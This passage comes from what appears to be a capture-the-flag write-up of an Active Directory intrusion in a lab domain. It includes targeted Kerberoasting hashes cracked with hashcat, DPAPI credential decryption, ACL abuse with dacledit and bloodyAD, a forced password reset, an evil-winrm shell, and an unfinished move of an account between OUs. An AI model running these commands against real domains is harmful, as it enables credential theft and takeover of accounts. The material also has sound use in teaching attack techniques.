$krb5tgs$23$*clerk.john$CITY.LOCAL$city.local/clerk.john*$2a1c012349071631b5121544df2f89ac$2fc323d51546434fb1fa3d09b4f265f60ff75db1d5c037926b7b2114d00cc860bf5b7b01f537da48061e27ca8725ab89f80d5716c8073ce5a45e7e0817ef069cb861a83958dd5c50aeb44f44ea61127e7b8918a7a5f9213e91455da0d04f70ff151059ba95f76a2da23bedb2a8d0bd536dab2e5b747d186f758e07cb49883091986343c14660415c867fa6ccf7c2a90e5353dcda006ab790f22e71e05312ca892711d695cc95d3fd67ee7132190a6df1a9adbbcc2dcde852917d303445470c3ccf17e0efe6f99ae01b5e1434ba6bec942b391ea882f4f733d839fa5e784053af4016a0f0c53a202ae45e856d73b01af3bfe2ea284ef8d9c3d1d0720a7cc78de102f9dac50489676c31826bc455e4e9d5cd0ec247b456c76233373b9c51d46dcc777e436cce1d7e8d1d866c10f37a2fbfe3291ab875c1241472aafc28626be4fa33403cff3c3027f60cf9f99da1ab3dfef224bbfc448143eb716a3af8be5f66811a542e0c02f45fd347838f87346127fd041ee1ca7b4f2e36ce9055e8dc9e787db1b04a72f2af91f94f6c96778738dac1abfe9a08c4a5470ae98a7683ceab68781b12fa7a6faa01d7afc7e6a786b2ecbcd5afd461c11cd357bd5ba3cbba0f30699c3705d3f80558a77800cff4dd4de61f50119dbf20af71227f21bcec76ac2e747769eb862b562435f90c5001db721a5f19e83871ef64228d0c685062101bb14f2bb7b9ba532a5c3e36258d99a9969bd3305be3b82a9eae323057b5e870be6466fa0a66f7cb707ae2acdfd3f50aec0fe463b233d41104f7b2a5571c09d6398f725d6f2b2d9a05177174920da74f856af30e613d93c1dd320d313649e6814471ebf2f2600a415483bd6c5945aad22a086d4b512c1ceadac9214d94a50ca634ec53202b19db08331c81a9a54dd10b4777df6e39dfbe51a65cfa7a5c73ce3530770f725e0952314a12b2c843bf530906edfc4c4d2e828a03b5ec23b1afb1635f7dae9f5a19770cb3842e12d22a1cc5b1034cee6568950c5e1bce407ac6fa73208517ec3b1df5d80d07b25e2fe2df0bb42ad126eebe04a8abf1b2255b788da402f80672799d7f6ccaee5bb326c9dd8a0b5deea4b07e8bbde8d1ced1b713ef5b49ffe7cbf3126efceaa63d34cf9c10f6f7bd743becef0e3a23ec6e60fed84b341c28ab61c67aaf1d049b796be5977743da70642825861fe2fe2de3075035d1d2768227745aa1c3219e734f4224137e6303df50c19c3c8da617a5f529ff78a8a57f5b40c9fde1a9bedf612234e740f4a7058f218903aa2d6d4c8b37d42ad85dcf205ed351b5f220cca2e7d155ae05545cfe18e88a48c60e8b390f8c2ce1b86dd70054a4b7d0cefd67968b8d7658de2e92f964887f4aef597a19cea3dc999ed5c4f931e1dfa33f37d7775e13264049de1ec2c08f921d693a31b61a35dcd063230b5f32ac476306401f7fc9e96289e37cf9173ccc8879c57970
[+] Printing hash for (maria.clerk)
$krb5tgs$23$*maria.clerk$CITY.LOCAL$city.local/maria.clerk*$6002d668e3524496b8ffb3eda437e00a$384b0a6a063f36c798633312deebd7ce73ba20cdc28efde3b560f24130959f481607a2af111d1db00588885cbb5ecb4cddcdc4c04723902ed6600f25f71c3fe0ae0bda03767c007b23bdee1b366acd2f94cc1c8fd4371cf2c1f3d0b671a422d6a57f2cd323d9955e5b6fc0a12b577956b3b15882f9df2855f35807871162f90f7b771854fee1bc44b06bf99874c565d46f73119b7dd7432c734d760061f6969601cb716da9880dfa78564cf087faf431a72528b7f74cd4225baf5622a16c046fd9f4c584a7f28a1f4372b7d09f4aa49c48778c97920384ce380d4c93ff79dd35359604a05e2b3f47531315317f8ec1f78205d20f212bd6b7775ea281746af486dee71c8fa05c2a053f210b1854402e1399f0d4bc989bd5c6c37dbedfaeea3ad1c9a1cd3da62fb6bbaae5432d1322e5d3cc34c2a54d534c1ef851ccdbe2fc314b858a0234f30c1673e7deae6e5323f12bc70a4ca8a2eaf99997067a21f3a2ff917aed9219ac85545bca01029bba90de6c97788c6f35f46eca167708a942ecb46ae7cfe6f451d92bd4cf9080338c5246964062ee0b880ae8b47dcb14be50f1c2acd47d7f62dadef22bd59664d17e81d09d8a6bc5344b2d9e1ee53a084770caf78b1c92e75431eae9987841319d7928bc223c28f61b4c99edf4cf6b92c26ecc4743e2ebde9fd8202c6f751480d941fddfbdc41e87db4bfdf556c7bed77c18ecf8ef31a40892bcdaa38d519be303658ae39de9e0899cfbaba52368006243454f772fd79f6c1041056c287b7b49daf6c4b2e9b3df95ef6a2d462398533baaa26886b70fe379f41028ef187a9cb86b94e8da85408cf0e96cf5710752574b01c6acae14ef0156a970176de5b78f4c9b950be0b987af24c6bf4f4ba627d4883d2baafaabe1dccb3397f0d4b09bffab5aa149e3c7d905a1c286f799888c06e6567574df35b6f8fd174fc40a166bde78b95d85b0adda0bbb9412c16b5e3f36c1071f257de625de989a71253b1fec07a0e4a0d44f716372e4262bdbb20b676ff249b0f63a2b3c35e74c331ca09caeb611ba5a169d916f0cee7352a94082ab3497b0d5a5d4e123a74ddda1e30398e181c690ef3974b68eb9218e26491a8c64efb265b84bc7007517d054ed9d76198f585274a8e715a0cf5d877ec72bae114aecaab629d858f2cc49f8cc246d8c8bc45dccaa4c6898f6484c27ed8c5ac0e3812da0fbc2f0d5329240392ac69c2ce9443a7487e0a72bc2a1d1cc3e65000026ee7be35417e31f07942a00f493c2ceddbcf190f3757fd7ddc8254157bdb300bdd85df07e44b577a3d59a2fc3ae37bd95657bba322ebfac755f3f51bbe53709a21d75752ed4dad042ad3bd7e73122b409d76c6ea9ef9ea86b38b494534e78332d9f92b3466add5298275bd1c7ce490b689411ba54137b077f8aa200a273cc23637748bb7254a0297f7c9adbddb79e375bfb1503f7a850289e2998f88a67
[VERBOSE] SPN added successfully for (paul.roberts)
[+] Printing hash for (paul.roberts)
$krb5tgs$23$*paul.roberts$CITY.LOCAL$city.local/paul.roberts*$b38e306eabd5b316c123883d7615aa36$6bcb8f71c6dc6d4f1d820a4695eee440de8de29692f13816528e185ae6c14520ef100e327f44d4c04363fd74bdf176ac5af23c20471466ed1fdcb2f0b4ec185cc4aecd3a6369a4a8402eccb3a046e188fcaf4d982efa79df92395c0dae3c15dee4d84b7a4cb2fab5e4e633b203829ef36d5bf08bf1800725fa8f6a7f2057cc55a267a7aa25a1ad5b5bc7379833e6b91c082ad4ec31587a0d35a8b495179ea30e7f464828956ac5a68fb017feb90efce1895c85780ebf368e19be67fd5f080f9b80f20f7453cf768b86484192d17d819bbb4c311f1fe5bf70a7edbdb0eef31fc75178e5a5650af458e4d6b38b4b4a7983a22d30b8636862990cf3cc81f57796acfe03f2118e39e189d6a8d20983bf43fa8e713ecff7ef969f5051b04d00283d17fd9a19b30f1bd51c30c44820de7171414c17116e724e68f6d5a04989be804b119ce57a3843fd604f1e9a433d5a012ae39bcd4409fe4c7761e1e1f3f7ee488b65cdb80ca9a07c2b925832d081f1961b422d117ff7584cb3aed214f7e87773e0a0a8a9987ede06e6412eeefa6da8b0c240d7831b29f98fcd213b334eac2332f2223eebcbad72fc40e77efcb208e5e3a563364d8ed63a46f7ccc2c2e8a5e880bf9cdd148314bfc5eca4eac38833142e00f450b76da5c71e7e01ebb5d98dbff271489f0a1ef4689326956ffa701a3a56c9a1fd401c8927d198edf20cb1223cfa6ab7672a791b5b6d52a17f52b1fc82894533bdeb3023df0e8e3bdbdcc84389ff89ea0a5ed1a345e9afcf664cb44594c04338ffb17f820910f32384dd7d11eac0c4c5549c6753329e69b0439c3bca4182bb645df1c2d79a4f7efd4ceb2b309ab3c380ddf29023b0a02a29b6345281475e26c5b547ee9c809b5a2a7cf1b06edd947842c1bdeefee243fbe5f75627086538f8ea2ee34be5b0ed5bb959d0bbe2a9e25e91e4352d11072ef4e221a56879c31880f3c7245421f913424b75e3e02e9d3821e4a408a4c62e0f2bef285f1a7746a14a51203be902f0e528a25e36471e8b26ce4177efbb27f17dff0a9e77277ea81167e0828132fbbdac4d2263dc7fd6732c688791cf9c0af1f4806aa020305f96c8ac1c998210af5993716556f709552dabc96bed94e80de73045b2e7044fa02eb663cab41c417eff4da0e3c38f31b5c5b79fee7fbb4a83ac2d065f36fe8955b36f8662b139d5d6901b8969d8ec4e077c7fc37ab0a19a7ff69e82864fa8a59fb372a6b3db96ddd546671c3407a15f69016d6d5b7b237ef9b804f7cd0b6372834117d9ce00587e762130f0fa9f0fcbd269c8e9bb9837d5ea7a3902a9ec8372537aeb21732298f7c35d55748b6fa5608d871d21d98194befc49f3aed24159b233c78b37987a3a883407e86e65e0109dfffe1e6744d22774f25639c7ea015dfa9db1a419ca184342620e234025fad60628b4f108dba1975e3f55b158a2611c1009481a777cb72cf110af
[VERBOSE] SPN removed successfully for (paul.roberts)
[VERBOSE] SPN added successfully for (nina.soto)
[+] Printing hash for (nina.soto)
$krb5tgs$23$*nina.soto$CITY.LOCAL$city.local/nina.soto*$70ca1749827d4ee7944f42db2ab312f4$eca00285c58f4b887214f5465fbfa88a4ca0409ba7be2dc89011da19ff513f44ec55cac338fc19aa63de893f7337eeb79066b7a2df86273a2e81121b43d7e7d59bd6f75ff15aa6b4cf1305ecb512bbaea53acccc315c61cd05a97dc677cc505d9fc9da195bb9c361670881fd0fa3b4c45d246026cd2ed913396c7bc7ddd6fe364f7ca3cce20ffc032a99d7247a2781e36ef71565d48fb1d00db1f785320b945b6cc5794d3f298a5e6a9d8403660e5309094c54f83d6f25035d86d6479d6e737647f142b3ff0d012f2b8fb778915700fca7d63086068b40e7eb6e45281ef16ff1618760ef71ee1e2773d4677479106a285dc8b9dd6adc6cd465180b65d3e938b428e5fcff4c935e7b0f268ebbd82d22c1e64f24ec45d8194074f4335990060ecfd91987db9ce703518dea98b681ad4ed36ee0a5cd14551359c676f0d38df8c98b0ecaa1872c6db968d14fd4614d0136eb72c3e4cf7b8a5dbea15f1dc4c03aa6260033f7a667559a3c2fcc11c3932381d8de481af7919a10bf656af7de74f4525069f9ccff768cfa992b1b410e0c857727c95c50cfc2ada9bda63261a0de976842f2d5c26d7676c930cd797f6cb242d3169f3700583dc6e901cdd12a52f7ba6c7ddc19cae28701cb8c741feb0063914859f6881760a31fd083a1550f715fb0e329cd904c908cd22e657c1d73fd0e72dd96393b961cf24581fd24d2760633bfd84a6e8acf5a834037139d0b9f6e8b004a5c3e6715dba16202212cce6bee889e40b829356d84fdd8ecf108f1d502344a3b7ea8b3378458d2d9b6806b2ef9f046528a94aa3043f3708db64bc28ad3d7eefd9ebc737801fb91b7bc98cc66a972b68fe7d41545bade723b86082782853fa2bdfd262b80dec6c6816624985aa2548fbfa117d869fb659273f88e2e9a186a32b6a3b57557cce20398e96fd93e0163abda7bdbbeed19bef0eb768ed749e8c3d580c4ac3445a1571a677131a7761e6c893580082e7ea95624063c46f1a625603e6c4bcf2330eb3f0190ca09bec37258bad935c8a946e2a7a59f32ec8a261a983118d73e5354845f87e47080d098477d5f4714d429eba2443badae0c0a3e075a47d0d2f067bc66cd64fa49e115513f15e7da9aaebba7e3c07d77b3ee5db2b9b073ddcc6b2bc89e4486da00e0dd17b9af0255e1835a77ee7bfaa3ee43c509d6f175fa39c7f7bf08e70b4e4c92b32f3cd2217a33b61b5ecc42efa16df172096ed6776efbb64208f7e5e4523d44ffb5f70145886e1f7e0c47024079fa1c4e1e5a45a2223b1ebac6ba14b51a40de2cf1181299743ac7eb1320c4711e9cba509bb664a60e6ca933b4081ff3e484567315b8c1105b8fb6234191fc488ac2785266a8b7a22f4c6a65b2860fc8392706d815c04b20202aa6e9720acf371ceaff4ff2373eae13d2a508813abdc30ae66de8bbfa42d7e49753a9f4446e552c7587880b2e3f48ed777aab80120e
[VERBOSE] SPN removed successfully for (nina.soto)
```
Dumped 4 hashes but one of them was found earlier for user `clerk.john` im interested in the other three

## Cracking the hashes
```python
hashcat hashes.txt /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*maria.clerk$CITY.LOCAL$city.local/maria.clerk*$6002d668e3524496b8ffb3eda437e00a$384b0a6a063f36c798633312deebd7ce73ba20cdc28efde3b560f24130959f481607a2af111d1db00588885cbb5ecb4cddcdc4c04723902ed6600f25f71c3fe0ae0bda03767c007b23bdee1b366acd2f94cc1c8fd4371cf2c1f3d0b671a422d6a57f2cd323d9955e5b6fc0a12b577956b3b15882f9df2855f35807871162f90f7b771854fee1bc44b06bf99874c565d46f73119b7dd7432c734d760061f6969601cb716da9880dfa78564cf087faf431a72528b7f74cd4225baf5622a16c046fd9f4c584a7f28a1f4372b7d09f4aa49c48778c97920384ce380d4c93ff79dd35359604a05e2b3f47531315317f8ec1f78205d20f212bd6b7775ea281746af486dee71c8fa05c2a053f210b1854402e1399f0d4bc989bd5c6c37dbedfaeea3ad1c9a1cd3da62fb6bbaae5432d1322e5d3cc34c2a54d534c1ef851ccdbe2fc314b858a0234f30c1673e7deae6e5323f12bc70a4ca8a2eaf99997067a21f3a2ff917aed9219ac85545bca01029bba90de6c97788c6f35f46eca167708a942ecb46ae7cfe6f451d92bd4cf9080338c5246964062ee0b880ae8b47dcb14be50f1c2acd47d7f62dadef22bd59664d17e81d09d8a6bc5344b2d9e1ee53a084770caf78b1c92e75431eae9987841319d7928bc223c28f61b4c99edf4cf6b92c26ecc4743e2ebde9fd8202c6f751480d941fddfbdc41e87db4bfdf556c7bed77c18ecf8ef31a40892bcdaa38d519be303658ae39de9e0899cfbaba52368006243454f772fd79f6c1041056c287b7b49daf6c4b2e9b3df95ef6a2d462398533baaa26886b70fe379f41028ef187a9cb86b94e8da85408cf0e96cf5710752574b01c6acae14ef0156a970176de5b78f4c9b950be0b987af24c6bf4f4ba627d4883d2baafaabe1dccb3397f0d4b09bffab5aa149e3c7d905a1c286f799888c06e6567574df35b6f8fd174fc40a166bde78b95d85b0adda0bbb9412c16b5e3f36c1071f257de625de989a71253b1fec07a0e4a0d44f716372e4262bdbb20b676ff249b0f63a2b3c35e74c331ca09caeb611ba5a169d916f0cee7352a94082ab3497b0d5a5d4e123a74ddda1e30398e181c690ef3974b68eb9218e26491a8c64efb265b84bc7007517d054ed9d76198f585274a8e715a0cf5d877ec72bae114aecaab629d858f2cc49f8cc246d8c8bc45dccaa4c6898f6484c27ed8c5ac0e3812da0fbc2f0d5329240392ac69c2ce9443a7487e0a72bc2a1d1cc3e65000026ee7be35417e31f07942a00f493c2ceddbcf190f3757fd7ddc8254157bdb300bdd85df07e44b577a3d59a2fc3ae37bd95657bba322ebfac755f3f51bbe53709a21d75752ed4dad042ad3bd7e73122b409d76c6ea9ef9ea86b38b494534e78332d9f92b3466add5298275bd1c7ce490b689411ba54137b077f8aa200a273cc23637748bb7254a0297f7c9adbddb79e375bfb1503f7a850289e2998f88a67:mariadbzt1221

$krb5tgs$23$*nina.soto$CITY.LOCAL$city.local/nina.soto*$70ca1749827d4ee7944f42db2ab312f4$eca00285c58f4b887214f5465fbfa88a4ca0409ba7be2dc89011da19ff513f44ec55cac338fc19aa63de893f7337eeb79066b7a2df86273a2e81121b43d7e7d59bd6f75ff15aa6b4cf1305ecb512bbaea53acccc315c61cd05a97dc677cc505d9fc9da195bb9c361670881fd0fa3b4c45d246026cd2ed913396c7bc7ddd6fe364f7ca3cce20ffc032a99d7247a2781e36ef71565d48fb1d00db1f785320b945b6cc5794d3f298a5e6a9d8403660e5309094c54f83d6f25035d86d6479d6e737647f142b3ff0d012f2b8fb778915700fca7d63086068b40e7eb6e45281ef16ff1618760ef71ee1e2773d4677479106a285dc8b9dd6adc6cd465180b65d3e938b428e5fcff4c935e7b0f268ebbd82d22c1e64f24ec45d8194074f4335990060ecfd91987db9ce703518dea98b681ad4ed36ee0a5cd14551359c676f0d38df8c98b0ecaa1872c6db968d14fd4614d0136eb72c3e4cf7b8a5dbea15f1dc4c03aa6260033f7a667559a3c2fcc11c3932381d8de481af7919a10bf656af7de74f4525069f9ccff768cfa992b1b410e0c857727c95c50cfc2ada9bda63261a0de976842f2d5c26d7676c930cd797f6cb242d3169f3700583dc6e901cdd12a52f7ba6c7ddc19cae28701cb8c741feb0063914859f6881760a31fd083a1550f715fb0e329cd904c908cd22e657c1d73fd0e72dd96393b961cf24581fd24d2760633bfd84a6e8acf5a834037139d0b9f6e8b004a5c3e6715dba16202212cce6bee889e40b829356d84fdd8ecf108f1d502344a3b7ea8b3378458d2d9b6806b2ef9f046528a94aa3043f3708db64bc28ad3d7eefd9ebc737801fb91b7bc98cc66a972b68fe7d41545bade723b86082782853fa2bdfd262b80dec6c6816624985aa2548fbfa117d869fb659273f88e2e9a186a32b6a3b57557cce20398e96fd93e0163abda7bdbbeed19bef0eb768ed749e8c3d580c4ac3445a1571a677131a7761e6c893580082e7ea95624063c46f1a625603e6c4bcf2330eb3f0190ca09bec37258bad935c8a946e2a7a59f32ec8a261a983118d73e5354845f87e47080d098477d5f4714d429eba2443badae0c0a3e075a47d0d2f067bc66cd64fa49e115513f15e7da9aaebba7e3c07d77b3ee5db2b9b073ddcc6b2bc89e4486da00e0dd17b9af0255e1835a77ee7bfaa3ee43c509d6f175fa39c7f7bf08e70b4e4c92b32f3cd2217a33b61b5ecc42efa16df172096ed6776efbb64208f7e5e4523d44ffb5f70145886e1f7e0c47024079fa1c4e1e5a45a2223b1ebac6ba14b51a40de2cf1181299743ac7eb1320c4711e9cba509bb664a60e6ca933b4081ff3e484567315b8c1105b8fb6234191fc488ac2785266a8b7a22f4c6a65b2860fc8392706d815c04b20202aa6e9720acf371ceaff4ff2373eae13d2a508813abdc30ae66de8bbfa42d7e49753a9f4446e552c7587880b2e3f48ed777aab80120e:123nina321
```
Two of the hashes cracked it did not crack `paul.roberts`

```python
maria.clerk:mariadbzt1221
nina.soto:123nina321
```
Now ill verify their access

```python
nxc smb DC-CC.city.local -u 'maria.clerk' -p 'mariadbzt1221' --shares
SMB         10.0.24.231     445    DC-CC            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.24.231     445    DC-CC            [+] city.local\maria.clerk:mariadbzt1221 
SMB         10.0.24.231     445    DC-CC            [*] Enumerated shares
SMB         10.0.24.231     445    DC-CC            Share           Permissions     Remark
SMB         10.0.24.231     445    DC-CC            -----           -----------     ------
SMB         10.0.24.231     445    DC-CC            ADMIN$                          Remote Admin
SMB         10.0.24.231     445    DC-CC            Backups                         
SMB         10.0.24.231     445    DC-CC            C$                              Default share
SMB         10.0.24.231     445    DC-CC            IPC$            READ            Remote IPC
SMB         10.0.24.231     445    DC-CC            NETLOGON        READ            Logon server share 
SMB         10.0.24.231     445    DC-CC            SYSVOL          READ            Logon server share 
SMB         10.0.24.231     445    DC-CC            Uploads

nxc smb DC-CC.city.local -u 'nina.soto' -p '123nina321' --shares
SMB         10.0.24.231     445    DC-CC            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.24.231     445    DC-CC            [+] city.local\nina.soto:123nina321 
SMB         10.0.24.231     445    DC-CC            [*] Enumerated shares
SMB         10.0.24.231     445    DC-CC            Share           Permissions     Remark
SMB         10.0.24.231     445    DC-CC            -----           -----------     ------
SMB         10.0.24.231     445    DC-CC            ADMIN$                          Remote Admin
SMB         10.0.24.231     445    DC-CC            Backups         READ            
SMB         10.0.24.231     445    DC-CC            C$                              Default share
SMB         10.0.24.231     445    DC-CC            IPC$            READ            Remote IPC
SMB         10.0.24.231     445    DC-CC            NETLOGON        READ            Logon server share 
SMB         10.0.24.231     445    DC-CC            SYSVOL          READ            Logon server share 
SMB         10.0.24.231     445    DC-CC            Uploads
```
Looks like maria is a low level user, nina has read access on backups which ive not looked at yet
Neither user has access over RDP or WINRM
In the backups share there are .wim files which are backups of user directories for `clerk.john` who has already been compromised and `sam.brooks`

# `message_sam.eml`
```python
Subject: Notice: web_admin account moved to Quarantine OU

Hi Sam,

This is to inform you that the web_admin account has been moved to the Quarantine OU following security concerns identified during recent system activity.
The web server has ASP.NET enabled and file uploads of .aspx pages are possible; in combination with the web_admin account this creates a scenario could be used to escalate privileges or perform unauthorized actions.

No production impact has been confirmed, but the account has been isolated for forensic review as a precautionary measure.

If you require any temporary access or need updates regarding the investigation, please contact Emma Hayes (Helpdesk) at emma.hayes for coordination and approval.

Regards,
Administrator
IT Operations

(Ref: CHGWEBAD
```
# Email to john about temporary access
```python
Subject: Temporary access while I’m on vacation

Hi John,

Quick heads-up: while I’m on vacation, you may use my account to handle urgent IT tasks.

Credentials
I’ll share the credentials with you via our approved channel. Please store them in Windows Credential Manager (Control Panel → User Accounts → Credential Manager → Windows Credentials → Add a Windows credential) and use them from there.

DPAPI note (why Credential Manager):
Windows Credential Manager protects saved credentials with DPAPI—they’re encrypted to your user profile (and this machine), so the password isn’t stored in plaintext. Still, treat it as sensitive: accounts with LOCAL SYSTEM / domain admin privileges can technically recover DPAPI-protected secrets, so only use it on trusted machines and profiles, and never export or sync these creds.

When I’m back
On my return, please remove the stored credential from Credential Manager. As discussed, your temporary membership in the “Remote Management” group will be revoked after my vacation.

Security reminders

Use the account only for work-related actions you’d normally escalate to IT.

Don’t save the password anywhere else or forward it.

Log off when finished and avoid keeping interactive sessions open.

Thanks for covering!

Best,
Emma Hayes
Helpdesk / IT Support
emma.hayes@city.local
```
This email was found in `clerk.john` desktop
# Compromising `emma.hayes`
Using engrampa archive manager i extracted the credential file and the master key file
```python
dpapi.py masterkey -file UserProfileBackups/de222e76-cb5d-418f-a1c2-7e4e9dfe29e1 -sid S-1-5-21-407732331-1521580060-1819249925-1103 -password 'clerkhill'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : de222e76-cb5d-418f-a1c2-7e4e9dfe29e1
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xedfc873c4b843cb27b48cb55d829bc24c8d2be3fd50ce2aa7ba72b8da6ec65afd41412dfecd16f38a120cadf4089dabb9a1817874e37bbf0d6861117a39dfbbd
```
I got `clerk.john` object id and used his password to get the key

```python
dpapi.py credential -file UserProfileBackups/03128079C6E14F37F5AEBDD69E344291 -key 0xedfc873c4b843cb27b48cb55d829bc24c8d2be3fd50ce2aa7ba72b8da6ec65afd41412dfecd16f38a120cadf4089dabb9a1817874e37bbf0d6861117a39dfbbd
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-10-30 15:53:55+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=emma-exclusive-access
Description : 
Unknown     : 
Username    : city.local\emma.hayes
Unknown     : !Gemma4James!
```
Ive managed to extract the creds, now ill verify access

```python
nxc ldap DC-CC.city.local -u emma.hayes -p '!Gemma4James!'             
LDAP        10.0.24.231     389    DC-CC            [*] Windows 10 / Server 2019 Build 17763 (name:DC-CC) (domain:city.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.24.231     389    DC-CC            [+] city.local\emma.hayes:!Gemma4James!
```
This user is now compromised, she does not have access over WINRM or RDP
Shes also only got read access on the default shares

# Bloodhound on `emma.hayes`
![[Pasted image 20260306201641.png|872]]
This user has quite a lot of outbound object control
# Compromising `sam.brooks`
This user is part of the remote management users group so ill target him first, looking at bloodhound sams account is currently disabled so ill have to re-enable it!
```python
dacledit.py -action 'write' -rights 'FullControl' -principal 'emma.hayes' -target 'sam.brooks' 'city.local'/'emma.hayes':'!Gemma4James!'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260306-202509.bak
[*] DACL modified successfully!
```
This granted full control over `sam.brooks` this means i can now change his password using GenericAll

```python
bloodyAD --host DC-cc.city.local -d city.local -u emma.hayes -p '!Gemma4James!' remove uac sam.brooks -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from sam.brooks's userAccountControl
```
This re-enabled the account

```python
net rpc password "sam.brooks" "Ethan-hacked-you69" -U "city.local"/"emma.hayes"%'!Gemma4James!' -S "DC-CC.city.local"
```
This changed the password

```python
nxc smb DC-CC.city.local -u 'sam.brooks' -p 'Ethan-hacked-you69' 
SMB         10.0.24.231     445    DC-CC            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.24.231     445    DC-CC            [+] city.local\sam.brooks:Ethan-hacked-you69
```
This shows the user is now compromised

## Evil-winrm access as `sam.brooks`
```python
evil-winrm -i DC-CC.city.local -u sam.brooks -p Ethan-hacked-you69                  
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sam.brooks\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\sam.brooks\Desktop> type user.txt

FLAG[UncLeSaMwasheRe]


⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠚⠉⠀⠀⠉⠑⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣠⠔⠋⠉⣩⣍⠉⠙⠢⣄⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢧⡜⢏⠓⠒⠚⠁⠈⠑⠒⠚⣹⢳⡸⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠸⡄⠀⠀⠀⠀⠀⠀⢠⠇⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡴⠚⠉⢣⡙⢦⡀⠀⠀⢀⡰⢋⡜⠉⠓⠦⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡴⠁⢀⣀⣀⣀⣙⣦⣉⣉⣋⣉⣴⣋⣀⣀⣀⡀⠈⢧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡸⠁⠀⢸⠀⠀⠀⠀⢀⣔⡛⠛⡲⡀⠀⠀⠀⠀⡇⠀⠈⢇⠀⠀⠀⠀
⠀⠀⠀⢠⠇⠀⠀⠸⡀⠀⠀⠀⠸⣼⠽⠯⢧⠇⠀⠀⠀⠀⡇⠀⠀⠘⡆⠀⠀⠀
⠀⠀⠀⣸⠀⠀⠀⠀⡇⠀⠀⠀⠳⢼⡦⢴⡯⠞⠀⠀⠀⢰⠀⠀⠀⠀⢧⠀⠀⠀
⠀⠀⠀⢻⠀⠀⠀⠀⡇⠀⠀⠀⢀⡤⠚⠛⢦⣀⠀⠀⠀⢸⠀⠀⠀⠀⡼⠀⠀⠀
⠀⠀⠀⠈⠳⠤⠤⣖⣓⣒⣒⣒⣓⣒⣒⣒⣒⣚⣒⣒⣒⣚⣲⠤⠤⠖⠁⠀⠀⠀
⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
*Evil-WinRM* PS C:\Users\sam.brooks\Desktop>
```
I now have access as this user
My next step i think is to compromise the webadmin

# Compromising `web_admin`
I currently have writeDACL on the cityops OU which contains users like sam
But i also have GenericWrite on the webadmin which means i should be able to move the user
I can move the user to the cityops OU which would mean i would once again have writeDACL and i could grant myself full control over the user webadmin, which would mean i could change his password

```python
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'emma.hayes' -target-dn 'OU=CITYOPS,DC=CITY,DC=LOCAL' 'city.local'/'emma.hayes':'!Gemma4James!'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20260307-155259.bak
[*] DACL modified successfully!
```
This has granted me GenericAll over the `cityops` OU this should allow me to move the web admin to the cityops OU

```python
cat cityops.ldif                              
dn: CN=Web Admin,OU=Quarantine,DC=city,DC=local
changetype: moddn
newrdn: CN=Web Admin
deleteoldrdn: 1
newsuperior: OU=CityOps,DC=city,DC=local
```
This is an LDIF file that when executed with ldapmodify should allow me to move the user 

```python
ldapmodify -H ldap://DC-CC.city.local -D 'emma.hayes@city.local' -w '!Gemma4James!' -f cityops.ldif
